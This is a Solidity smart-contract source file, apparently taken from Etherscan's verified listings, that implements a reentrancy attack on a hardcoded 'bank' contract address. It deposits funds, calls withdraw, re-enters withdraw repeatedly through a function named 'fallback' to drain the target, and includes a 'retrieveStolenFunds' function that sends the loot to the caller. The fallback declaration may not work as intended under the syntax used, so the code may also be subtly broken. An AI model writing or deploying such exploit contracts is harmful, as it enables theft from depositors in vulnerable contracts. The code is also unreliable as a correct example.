/**
 *Submitted for verification at Etherscan.io on 2021-10-07
*/

/**
 *Submitted for verification at Etherscan.io on 2021-04-13
*/

interface targetInterface{
      function deposit() external payable; 
     function withdraw(uint withdrawAmount) external; 
    }
   
    contract simpleReentrancyAttack{
     targetInterface bankAddress = targetInterface(0x394D14eAdE0686137Dd1cab3472e52c81Edd19f2); 
      uint amount = 0.1 ether; 
   
 function deposit() public payable{
    bankAddress.deposit.value(amount)();
  }
    
  function attack() public payable{
    bankAddress.withdraw(amount); 
  }
  
  function retrieveStolenFunds() public {
    msg.sender.transfer(address(this).balance);
  }
  
  function fallback () external payable{ 
    if (address(bankAddress).balance >= amount){
         bankAddress.withdraw(amount);
    }   
  }
}